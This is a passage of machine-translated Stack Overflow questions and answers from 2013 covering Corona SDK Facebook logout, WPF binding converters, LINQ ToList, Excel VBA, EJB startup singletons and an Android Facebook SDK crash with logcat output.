selenium.find_element(By.ID, 'input_field_id').send_keys("path\\\\to\\\\file") 
```

对于 Windows，使用 4 '\\\\' 作为路径分隔符。

# ios - 注销 Facebook 并清除电晕中的会话

> ID：15357802
> 
> 赞同：2
> 
> 时间：2013-03-12T09:44:06.193
> 
> 标签：ios, facebook, session, coronasdk, logout

我有一个由 lua 使用 corona SDK 编写的应用程序。我需要注销 Facebook 用户并清除设备中的会话。但是在我使用 corona API 注销用户后，会话或 cookie 使用户保持登录状态！

如何从 Facebook 完全注销用户并清除 Corona 中的会话和 cookie？

我已经搜索了很多但找不到解决方案！也许另一种方法是通过在我的设备中使用 facebook 的访问令牌来注销用户？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-22T05:28:28.457

我建议你看看这个博客，那里有你问题的答案

[http://forums.coronalabs.com/topic/42051-does-facebooklogout-actually-do-anything/](http://forums.coronalabs.com/topic/42051-does-facebooklogout-actually-do-anything/)

希望这可以在某种程度上帮助你

# wpf - 自定义控件的背景依赖属性更改时的更改事件

> ID：15357804
> 
> 赞同：2
> 
> 时间：2013-03-12T09:44:12.250
> 
> 标签：wpf, custom-controls

我正在创建具有特定属性（和事件）的自定义 WPF 控件。我的按钮应该能够根据按钮当前设置的背景颜色来改变它的前景色。

现在，这在更改重写的 OnApplyTemplate 函数中的颜色时有效，但我还没有找到如何动态地执行此操作（在加载控件之后）。

如果我可以将 DependencyPropertyChanged 事件处理程序添加到控件背景属性，这将解决我的问题，但我不知道如何。

其他相当丑陋的解决方案可以工作：

*   为每个 Button 单独的 backgroundworker 检查当前的背景颜色（如果存在足够多的按钮，这可能是一个真正的性能杀手）
*   使用自定义 BackgroundColor 属性而不是 Background（可以，但看起来不是很优雅）

有人有解决办法吗？

编辑：

好的，在看到控件的Background 属性可能会根据其父Background 属性（如果没有专门设置）发生变化后，我将添加一个单独的BackgroundColor 属性，它实际上只影响Button 的背景。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:51:24.100

您可以使用绑定转换器来做到这一点。

[http://tech.pro/tutorial/806/wpf-tutorial-binding-converters](http://tech.pro/tutorial/806/wpf-tutorial-binding-converters)

或者，也许更容易实现，触发器。

[http://wpftutorial.net/Triggers.html](http://wpftutorial.net/Triggers.html)

**编辑（一些例子）：**

Binding Converter Sample - 仅在 UserControl 上，但应该显示它是如何完成的。

在 UCButton.xaml.cs 中：

```
using System;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Media;

namespace Test3
{
    public partial class UCButton : UserControl
    {
        public UCButton()
        {
            InitializeComponent();

            this.DataContext = this;
        }
    }

    [ValueConversion(typeof(Brush), typeof(Brush))]
    public class BrushConverter : IValueConverter
    {
        public object Convert(object value, Type targetType,
               object parameter, System.Globalization.CultureInfo culture)
        {
            Brush background = (Brush)value;

            if (background == Brushes.Pink)
                return Brushes.Red;
            else if (background == Brushes.LightBlue)
                return Brushes.DarkBlue;
            else if (background == Brushes.LightGreen)
                return Brushes.DarkGreen;
            else
                return Brushes.Black;
        }

        public object ConvertBack(object value, Type targetType,
               object parameter, System.Globalization.CultureInfo culture)
        {
            throw new NotImplementedException();
        }
    }
} 
```

UCButton.xaml

```
<UserControl x:Class="Test3.UCButton"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             xmlns:local="clr-namespace:Test3" mc:Ignorable="d" 
             d:DesignHeight="29" d:DesignWidth="82">

    <UserControl.Resources>
        <local:BrushConverter x:Key="brushConverter" />
    </UserControl.Resources>

    <Grid>
        <Button Content="Button" Name="button1" Background="{Binding Background}" Foreground="{Binding Background, Converter={StaticResource brushConverter}}" />
    </Grid>
</UserControl> 
```

使用触发器的示例：

在 MainWindow.xaml 添加：

```
<Window.Resources>
    <Style x:Key="buttonBrushStyle" TargetType="Button">
        <Style.Triggers>
            <Trigger Property="Background" Value="Pink">
                <Setter Property="Foreground" Value="Red" />
            </Trigger>
            <Trigger Property="Background" Value="LightBlue">
                <Setter Property="Foreground" Value="DarkBlue" />
            </Trigger>
        </Style.Triggers>
    </Style>
</Window.Resources>

<Button Style="{StaticResource buttonBrushStyle}" Content="Button"
   Height="23" Width="75" Background="Pink" />
<Button Style="{StaticResource buttonBrushStyle}" Content="Button"
   Height="23" Width="75" Background="LightBlue" /> 
```

# c# - 如何将 Linq var 转换为 List

> ID：15357808
> 
> 赞同：3
> 
> 时间：2013-03-12T09:44:23.900
> 
> 标签：c#, asp.net, linq, list, var

我正在尝试将 Linq var 转换为 List.my c# 代码是

```
private List<HyperlinkInfo> GetHyperlinkByCode()
{
        TourInfoBusiness obj = new TourInfoBusiness();
        List<HyperlinkInfo> lst = new List<HyperlinkInfo>();
        lst = obj.GetAllHyperlink();
        //lst = lst.Select(x => x.Attraction).ToList();
        var k = lst.Select(x => x.Attraction).Distinct();            
} 
```

如果您查看上面的代码直到 Line var`k = lst.Select(x => x.Attraction).Distinct();`正常，现在我可以将 var k 转换为 List。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:49:42.993

根据您的评论，您需要`HyperlinInfo`为每个`Attraction`值（即字符串）提供一个对象。所以，使用分组和`ToList()`：

```
private List<HyperlinkInfo> GetHyperlinkByCode()
{
        TourInfoBusiness obj = new TourInfoBusiness();
        List<HyperlinkInfo> lst = obj.GetAllHyperlink();
        return lst.GroupBy(x => x.Attraction) // group links by attraction
                  .Select(g => g.First()) // select first link from each group
                  .ToList(); // convert result to list
} 
```

您还可以使用[morelinq](http://code.google.com/p/morelinq/source/browse/MoreLinq/DistinctBy.cs?r=d4396b9ff63932be0ab07c36452a481d20f96307) **DistinctBy**扩展（可从 NuGet 获得）：

```
private List<HyperlinkInfo> GetHyperlinkByCode()
{
        TourInfoBusiness obj = new TourInfoBusiness();
        List<HyperlinkInfo> lst = obj.GetAllHyperlink();
        return lst.DistinctBy(x => x.Attraction).ToList();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-12T09:45:10.133

使用[`Enumerable.ToList<TSource> Method`](http://msdn.microsoft.com/en-us/library/bb342261.aspx). 只需`ToList()`在查询末尾添加或

```
return k.ToList(); 
```

所以你的方法可以是：

```
private List<HyperlinkInfo> GetHyperlinkByCode()
{
        TourInfoBusiness obj = new TourInfoBusiness();
        List<HyperlinkInfo> lst = new List<HyperlinkInfo>();
        lst = obj.GetAllHyperlink();
        //lst = lst.Select(x => x.Attraction).ToList();
        var k = lst.Select(x => x.Attraction).Distinct();
        return k.ToList();
} 
```

但`x.Attraction`应该是`HyperLinkInfo`类型对象。

**编辑：**根据评论，它似乎`x.Attraction`是一个字符串，您需要`Project.Bll.HyperlinkInfo`在 select 语句中创建类的对象，然后返回该列表。就像是：

```
var k = lst.Select(new Project.Bll.HyperLinkInfo(x => x.Attraction)).Distinct(); 
```

假设`Project.Bll.HyperlinkInfo`构造函数接受一个字符串参数来返回一个`HyperLinkInfo`对象。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-12T09:45:42.633

用这个：

```
var k = lst.Select(x => x.Attraction).Distinct().ToList(); 
```

现在`k`是`x.Attraction`类型列表。如果你`x.Attraction`是`string`，使用这个：

```
List<string> k = lst.Select(x => x.Attraction).Distinct().ToList(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:46:30.140

用于[`ToList()`](http://msdn.microsoft.com/en-us/library/bb342261.aspx)您的查询；

> 从. `List<T>`_`IEnumerable<T>`

```
List<HyperlinkInfo> k = lst.Select(x => x.Attraction).Distinct().ToList(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-12T10:17:51.830

试试这个代码：

```
return (List<Hyperlink Info>) k 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-12T10:26:53.350

试试这个添加 DistinctBy 的[moreLinq](https://code.google.com/p/morelinq/)：

```
public static IEnumerable<TSource> DistinctBy<TSource, TKey>
    (this IEnumerable<TSource> source, Func<TSource, TKey> keySelector)
{
    HashSet<TKey> seenKeys = new HashSet<TKey>();
    foreach (TSource element in source)
    {
        if (seenKeys.Add(keySelector(element)))
        {
            yield return element;
        }
    }
} 
```

并在您的代码中调用它：

```
lst.DistinctBy(x => x.Attraction).toList(); 
```

# vba - Excel VBA循环遍历范围中的列并复制列

> ID：15357809
> 
> 赞同：-1
> 
> 时间：2013-03-12T09:44:32.987
> 
> 标签：vba, loops, excel

我是 Excel VBA 的新手，需要一些帮助来编写宏。

从我需要复制 range 的每一列`Worksheet1`，一次一个，并将其 pasteValue 到 cells 。`Workbook1``D1:Z100``B1:B100`

这会触发 中的`Worksheet2`计算`Workbook1`。在这里，我需要将单元格复制`A1:B200`到一个新的工作簿中。

`Worksheet1`此新工作簿将使用单元格中的文本字符串进行重命名`B1`。新工作簿将保存到与`Workbook1`.

然后循环继续从 中的下一列`Worksheet1`，并继续直到范围中的所有列都以这种方式处理。

我花了两天时间在网上搜索以找到答案，但没有任何运气......

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-12T12:33:12.203

以我们大多数人的方式开始：

1.  录制新宏。
2.  手动执行您想要自动化的所有步骤。
3.  停止录制。
4.  转到开发人员选项卡并检查自动生成的代码。
5.  根据您在第 4 步中学到的内容编写您自己的 VBA。

您将不得不自己弄清楚一些事情，或者回到这里并提出具体问题。

# java - 在 EJB3.1 中执行初始化代码

> ID：15357810
> 
> 赞同：4
> 
> 时间：2013-03-12T09:44:33.800
> 
> 标签：java, jpa, ejb-3.1

在使用 Spring 多年后，我目前正在迁移到 EJB3.1。我想在 EJB 中实现的一件事是我的 MigrationManager。在 Spring 中，我有一个处理数据库模式和数据迁移的 bean。为此，我实现了一个 Spring BeanFactoryPostProcessor，因为这样我注入了数据库连接，但 JPA 系统尚未初始化。所以我可以执行所有迁移步骤，然后让应用程序完成启动。

我怎么能在 EJB3.1 中做这样的事情（使用 CDI ......如果这很重要）

克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T19:18:45.263

这是从 EJB 运行一些初始化代码的方法：

```
@Singleton
@Startup
public class MigrationManager {
    @PostConstruct
    public void migrate() {
       // do work
    }
} 
```

您不需要单独的应用程序（如上面的评论中所建议）。

EntityManager 被延迟实例化，因此只要您不将 an 注入到其他一些启动代码中，这应该让您有机会在 an实际访问数据库`EntityManager`之前更新您的数据库模式。`EntityManager`

顺便说一句，对于数据库模式迁移，我推荐[Liquibase](http://www.liquibase.org/)，它可以由`ServletContextListener`.

# android - 如何将 Facebook 集成到我的 android 应用程序中？

> ID：15357811
> 
> 赞同：-2
> 
> 时间：2013-03-12T09:44:42.870
> 
> 标签：android, facebook

我正在为 facebook 集成编写代码。我创建了 App Id 并导入了 facebook sdk。我在我的主要活动上放了一个按钮，它将打开一个询问登录 id 和密码的 facebook 对话框。但是单击显示“强制关闭”的 AVD。在该按钮内，我正在调用以下函数：

```
public void loginToFacebook() {
        mPrefs = getPreferences(MODE_PRIVATE);
        String access_token = mPrefs.getString("access_token", null);
        long expires = mPrefs.getLong("access_expires", 0);

        if (access_token != null) {
            facebook.setAccessToken(access_token);
        }

        if (expires != 0) {
            facebook.setAccessExpires(expires);
        }

        if (!facebook.isSessionValid()) {
            facebook.authorize(this,
                    new String[] { "email", "publish_stream" },
                    new DialogListener() {

                        @Override
                        public void onCancel() {
                            // Function to handle cancel event
                        }

                        @Override
                        public void onComplete(Bundle values) {
                            // Function to handle complete event
                            // Edit Preferences and update facebook acess_token
                            SharedPreferences.Editor editor = mPrefs.edit();
                            editor.putString("access_token",
                                    facebook.getAccessToken());
                            editor.putLong("access_expires",
                                    facebook.getAccessExpires());
                            editor.commit();
                        }

                        @Override
                        public void onFacebookError(FacebookError e) {
                            // TODO Auto-generated method stub

                        }

                        @Override
                        public void onError(DialogError e) {
                            // TODO Auto-generated method stub

                        }

                    });
        }
        } 
```

以下是logcat：

```
03-12 14:57:44.676: W/com.facebook.Session(499): Should not pass a read permission (email) to a request for publish or manage authorization
03-12 14:57:44.861: W/dalvikvm(499): VFY: unable to resolve static field 1431 (com_facebook_login_activity_layout) in Lcom/facebook/android/R$layout;
03-12 14:57:44.872: D/dalvikvm(499): VFY: replacing opcode 0x60 at 0x0003
03-12 14:57:44.872: D/dalvikvm(499): VFY: dead code 0x0005-0051 in Lcom/facebook/LoginActivity;.onCreate (Landroid/os/Bundle;)V
03-12 14:57:44.876: W/dalvikvm(499): VFY: unable to resolve static field 1413 (com_facebook_login_activity_progress_bar) in Lcom/facebook/android/R$id;
03-12 14:57:44.876: D/dalvikvm(499): VFY: replacing opcode 0x60 at 0x0008
03-12 14:57:44.876: D/dalvikvm(499): VFY: dead code 0x000a-0013 in Lcom/facebook/LoginActivity;.onPause ()V
03-12 14:57:45.126: W/dalvikvm(499): VFY: unable to resolve static field 1440 (com_facebook_internet_permission_error_title) in Lcom/facebook/android/R$string;
03-12 14:57:45.126: D/dalvikvm(499): VFY: replacing opcode 0x60 at 0x0010
03-12 14:57:45.126: D/dalvikvm(499): VFY: dead code 0x0012-0026 in Lcom/facebook/AuthorizationClient;.checkInternetPermission ()Z
03-12 14:57:45.986: W/dalvikvm(499): VFY: unable to resolve static field 1407 (com_facebook_close) in Lcom/facebook/android/R$drawable;
03-12 14:57:45.986: D/dalvikvm(499): VFY: replacing opcode 0x60 at 0x001d
03-12 14:57:46.006: D/dalvikvm(499): VFY: dead code 0x001f-002e in Lcom/facebook/widget/WebDialog;.createCrossImage ()V
03-12 14:57:46.026: W/dalvikvm(499): VFY: unable to resolve static field 1441 (com_facebook_loading) in Lcom/facebook/android/R$string;
03-12 14:57:46.026: D/dalvikvm(499): VFY: replacing opcode 0x60 at 0x0024
03-12 14:57:46.036: D/dalvikvm(499): VFY: dead code 0x0026-006d in Lcom/facebook/widget/WebDialog;.onCreate (Landroid/os/Bundle;)V
03-12 14:57:46.070: D/AndroidRuntime(499): Shutting down VM
03-12 14:57:46.070: W/dalvikvm(499): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
03-12 14:57:46.243: E/AndroidRuntime(499): FATAL EXCEPTION: main
03-12 14:57:46.243: E/AndroidRuntime(499): java.lang.NoClassDefFoundError: com.facebook.android.R$string
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.widget.WebDialog.onCreate(WebDialog.java:188)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.app.Dialog.dispatchOnCreate(Dialog.java:307)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.app.Dialog.show(Dialog.java:225)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.AuthorizationClient$WebViewAuthHandler.tryAuthorize(AuthorizationClient.java:461)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.AuthorizationClient.tryCurrentHandler(AuthorizationClient.java:209)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.AuthorizationClient.tryNextHandler(AuthorizationClient.java:188)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.AuthorizationClient.authorize(AuthorizationClient.java:116)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.AuthorizationClient.startOrContinueAuth(AuthorizationClient.java:97)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.Session.tryLegacyAuth(Session.java:1096)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.Session.authorize(Session.java:893)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.Session.open(Session.java:957)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.Session.openForPublish(Session.java:415)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.android.Facebook.openSession(Facebook.java:319)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.android.Facebook.authorize(Facebook.java:313)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.facebook.android.Facebook.authorize(Facebook.java:149)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.example.kumarfbapp.FBActivity.loginToFacebook(FBActivity.java:61)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.example.kumarfbapp.FBActivity$1.onClick(FBActivity.java:40)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.view.View.performClick(View.java:2408)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.view.View$PerformClick.run(View.java:8816)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.os.Handler.handleCallback(Handler.java:587)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.os.Handler.dispatchMessage(Handler.java:92)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.os.Looper.loop(Looper.java:123)
03-12 14:57:46.243: E/AndroidRuntime(499):  at android.app.ActivityThread.main(ActivityThread.java:4627)
03-12 14:57:46.243: E/AndroidRuntime(499):  at java.lang.reflect.Method.invokeNative(Native Method)
03-12 14:57:46.243: E/AndroidRuntime(499):  at java.lang.reflect.Method.invoke(Method.java:521)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
03-12 14:57:46.243: E/AndroidRuntime(499):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
03-12 14:57:46.243: E/AndroidRuntime(499):  at dalvik.system.NativeStart.main(Native Method)
03-12 14:57:52.052: I/Process(499): Sending signal. PID: 499 SIG: 9
03-12 15:02:48.486: W/com.facebook.Session(531): Should not pass a read permission (email) to a request for publish or manage authorization
03-12 15:02:48.506: W/dalvikvm(531): VFY: unable to resolve static field 1431 (com_facebook_login_activity_layout) in Lcom/facebook/android/R$layout;
03-12 15:02:48.506: D/dalvikvm(531): VFY: replacing opcode 0x60 at 0x0003
03-12 15:02:48.506: D/dalvikvm(531): VFY: dead code 0x0005-0051 in Lcom/facebook/LoginActivity;.onCreate (Landroid/os/Bundle;)V
03-12 15:02:48.506: W/dalvikvm(531): VFY: unable to resolve static field 1413 (com_facebook_login_activity_progress_bar) in Lcom/facebook/android/R$id;
03-12 15:02:48.506: D/dalvikvm(531): VFY: replacing opcode 0x60 at 0x0008
03-12 15:02:48.506: D/dalvikvm(531): VFY: dead code 0x000a-0013 in Lcom/facebook/LoginActivity;.onPause ()V
03-12 15:02:48.596: W/dalvikvm(531): VFY: unable to resolve static field 1440 (com_facebook_internet_permission_error_title) in Lcom/facebook/android/R$string;
03-12 15:02:48.596: D/dalvikvm(531): VFY: replacing opcode 0x60 at 0x0010
03-12 15:02:48.606: D/dalvikvm(531): VFY: dead code 0x0012-0026 in Lcom/facebook/AuthorizationClient;.checkInternetPermission ()Z
03-12 15:02:48.716: W/dalvikvm(531): VFY: unable to resolve static field 1407 (com_facebook_close) in Lcom/facebook/android/R$drawable;
03-12 15:02:48.716: D/dalvikvm(531): VFY: replacing opcode 0x60 at 0x001d
03-12 15:02:48.716: D/dalvikvm(531): VFY: dead code 0x001f-002e in Lcom/facebook/widget/WebDialog;.createCrossImage ()V
03-12 15:02:48.726: W/dalvikvm(531): VFY: unable to resolve static field 1441 (com_facebook_loading) in Lcom/facebook/android/R$string;
03-12 15:02:48.726: D/dalvikvm(531): VFY: replacing opcode 0x60 at 0x0024
03-12 15:02:48.736: D/dalvikvm(531): VFY: dead code 0x0026-006d in Lcom/facebook/widget/WebDialog;.onCreate (Landroid/os/Bundle;)V
03-12 15:02:48.746: D/AndroidRuntime(531): Shutting down VM
03-12 15:02:48.746: W/dalvikvm(531): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
03-12 15:02:48.756: E/AndroidRuntime(531): FATAL EXCEPTION: main
03-12 15:02:48.756: E/AndroidRuntime(531): java.lang.NoClassDefFoundError: com.facebook.android.R$string
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.widget.WebDialog.onCreate(WebDialog.java:188)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.app.Dialog.dispatchOnCreate(Dialog.java:307)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.app.Dialog.show(Dialog.java:225)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.AuthorizationClient$WebViewAuthHandler.tryAuthorize(AuthorizationClient.java:461)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.AuthorizationClient.tryCurrentHandler(AuthorizationClient.java:209)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.AuthorizationClient.tryNextHandler(AuthorizationClient.java:188)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.AuthorizationClient.authorize(AuthorizationClient.java:116)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.AuthorizationClient.startOrContinueAuth(AuthorizationClient.java:97)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.Session.tryLegacyAuth(Session.java:1096)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.Session.authorize(Session.java:893)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.Session.open(Session.java:957)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.Session.openForPublish(Session.java:415)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.android.Facebook.openSession(Facebook.java:319)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.android.Facebook.authorize(Facebook.java:313)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.facebook.android.Facebook.authorize(Facebook.java:149)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.example.kumarfbapp.FBActivity.loginToFacebook(FBActivity.java:62)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.example.kumarfbapp.FBActivity$1.onClick(FBActivity.java:41)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.view.View.performClick(View.java:2408)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.view.View$PerformClick.run(View.java:8816)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.os.Handler.handleCallback(Handler.java:587)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.os.Handler.dispatchMessage(Handler.java:92)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.os.Looper.loop(Looper.java:123)
03-12 15:02:48.756: E/AndroidRuntime(531):  at android.app.ActivityThread.main(ActivityThread.java:4627)
03-12 15:02:48.756: E/AndroidRuntime(531):  at java.lang.reflect.Method.invokeNative(Native Method)
03-12 15:02:48.756: E/AndroidRuntime(531):  at java.lang.reflect.Method.invoke(Method.java:521)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
03-12 15:02:48.756: E/AndroidRuntime(531):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
03-12 15:02:48.756: E/AndroidRuntime(531):  at dalvik.system.NativeStart.main(Native Method)
03-12 15:02:52.136: I/Process(531): Sending signal. PID: 531 SIG: 9
03-12 15:03:36.066: W/com.facebook.Session(561): Should not pass a read permission (email) to a request for publish or manage authorization
03-12 15:03:36.086: W/dalvikvm(561): VFY: unable to resolve static field 1431 (com_facebook_login_activity_layout) in Lcom/facebook/android/R$layout;
03-12 15:03:36.086: D/dalvikvm(561): VFY: replacing opcode 0x60 at 0x0003
03-12 15:03:36.086: D/dalvikvm(561): VFY: dead code 0x0005-0051 in Lcom/facebook/LoginActivity;.onCreate (Landroid/os/Bundle;)V
03-12 15:03:36.086: W/dalvikvm(561): VFY: unable to resolve static field 1413 (com_facebook_login_activity_progress_bar) in Lcom/facebook/android/R$id;
03-12 15:03:36.086: D/dalvikvm(561): VFY: replacing opcode 0x60 at 0x0008
03-12 15:03:36.086: D/dalvikvm(561): VFY: dead code 0x000a-0013 in Lcom/facebook/LoginActivity;.onPause ()V
03-12 15:03:36.136: W/dalvikvm(561): VFY: unable to resolve static field 1440 (com_facebook_internet_permission_error_title) in Lcom/facebook/android/R$string;
03-12 15:03:36.136: D/dalvikvm(561): VFY: replacing opcode 0x60 at 0x0010
03-12 15:03:36.136: D/dalvikvm(561): VFY: dead code 0x0012-0026 in Lcom/facebook/AuthorizationClient;.checkInternetPermission ()Z
03-12 15:03:36.226: W/dalvikvm(561): VFY: unable to resolve static field 1407 (com_facebook_close) in Lcom/facebook/android/R$drawable;
03-12 15:03:36.226: D/dalvikvm(561): VFY: replacing opcode 0x60 at 0x001d
03-12 15:03:36.226: D/dalvikvm(561): VFY: dead code 0x001f-002e in Lcom/facebook/widget/WebDialog;.createCrossImage ()V
03-12 15:03:36.246: W/dalvikvm(561): VFY: unable to resolve static field 1441 (com_facebook_loading) in Lcom/facebook/android/R$string;
03-12 15:03:36.246: D/dalvikvm(561): VFY: replacing opcode 0x60 at 0x0024
03-12 15:03:36.246: D/dalvikvm(561): VFY: dead code 0x0026-006d in Lcom/facebook/widget/WebDialog;.onCreate (Landroid/os/Bundle;)V
03-12 15:03:36.256: D/AndroidRuntime(561): Shutting down VM
03-12 15:03:36.256: W/dalvikvm(561): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
03-12 15:03:36.266: E/AndroidRuntime(561): FATAL EXCEPTION: main
03-12 15:03:36.266: E/AndroidRuntime(561): java.lang.NoClassDefFoundError: com.facebook.android.R$string
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.widget.WebDialog.onCreate(WebDialog.java:188)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.app.Dialog.dispatchOnCreate(Dialog.java:307)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.app.Dialog.show(Dialog.java:225)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.AuthorizationClient$WebViewAuthHandler.tryAuthorize(AuthorizationClient.java:461)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.AuthorizationClient.tryCurrentHandler(AuthorizationClient.java:209)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.AuthorizationClient.tryNextHandler(AuthorizationClient.java:188)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.AuthorizationClient.authorize(AuthorizationClient.java:116)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.AuthorizationClient.startOrContinueAuth(AuthorizationClient.java:97)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.Session.tryLegacyAuth(Session.java:1096)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.Session.authorize(Session.java:893)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.Session.open(Session.java:957)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.Session.openForPublish(Session.java:415)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.android.Facebook.openSession(Facebook.java:319)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.android.Facebook.authorize(Facebook.java:313)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.facebook.android.Facebook.authorize(Facebook.java:149)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.example.kumarfbapp.FBActivity.loginToFacebook(FBActivity.java:64)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.example.kumarfbapp.FBActivity$1.onClick(FBActivity.java:43)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.view.View.performClick(View.java:2408)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.view.View$PerformClick.run(View.java:8816)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.os.Handler.handleCallback(Handler.java:587)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.os.Handler.dispatchMessage(Handler.java:92)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.os.Looper.loop(Looper.java:123)
03-12 15:03:36.266: E/AndroidRuntime(561):  at android.app.ActivityThread.main(ActivityThread.java:4627)
03-12 15:03:36.266: E/AndroidRuntime(561):  at java.lang.reflect.Method.invokeNative(Native Method)
03-12 15:03:36.266: E/AndroidRuntime(561):  at java.lang.reflect.Method.invoke(Method.java:521)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
03-12 15:03:36.266: E/AndroidRuntime(561):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
03-12 15:03:36.266: E/AndroidRuntime(561):  at dalvik.system.NativeStart.main(Native Method)
0 
```

3-12 15:03:38.336: I/Process(561): 发送信号。PID：561 SIG：9

请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:05:21.120

请通过此[https://github.com/facebook/facebook-android-sdk/](https://github.com/facebook/facebook-android-sdk/)和[https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/](https://developers.facebook.com/docs/getting-started/facebook-sdk-for-android/3.0/)

```
private OnClickListener loginButtonListener = new OnClickListener() {
    public void onClick(View v) {
        if (!mFacebook.isSessionValid()) {
            Toast.makeText(Login.this, "Authorizing", Toast.LENGTH_SHORT)
                    .show();
            mFacebook.authorize(Login.this, new String[] { "" },
                    new LoginDialogListener());
        } else {
            Toast.makeText(Login.this, "Has valid session",
                    Toast.LENGTH_SHORT).show();
            try {
                JSONObject json = Util.parseJson(mFacebook.request("me"));
                String facebookID = json.getString("id");
                String firstName = json.getString("first_name");
                String lastName = json.getString("last_name");
                Toast.makeText(
                        Login.this,
                        "You already have a valid session, " + firstName
                                + " " + lastName
                                + ". No need to re-authorize.",
                        Toast.LENGTH_SHORT).show();
            } catch (Exception error) {
                Toast.makeText(Login.this, error.toString(),
                        Toast.LENGTH_SHORT).show();
            } catch (FacebookError error) {
                Toast.makeText(Login.this, error.toString(),
                        Toast.LENGTH_SHORT).show();
            }
        }
    }
}; 
```

